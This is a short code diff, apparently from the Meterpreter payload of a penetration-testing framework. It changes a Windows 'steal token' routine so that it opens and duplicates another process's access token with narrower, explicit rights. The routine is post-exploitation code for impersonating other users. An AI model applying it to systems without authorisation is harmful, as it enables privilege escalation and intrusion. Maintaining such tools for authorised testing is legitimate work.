@@ -400,7 +400,7 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 			break;
 		}
 
-		if (!OpenProcessToken(hProcessHandle, TOKEN_ALL_ACCESS, &hToken))
+		if (!OpenProcessToken(hProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
 		{
 			dwResult = GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", dwPid, dwResult);
@@ -414,7 +414,7 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 			break;
 		}
 
-		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
+		if (!DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
 		{
 			dwResult = GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", dwPid, dwResult);
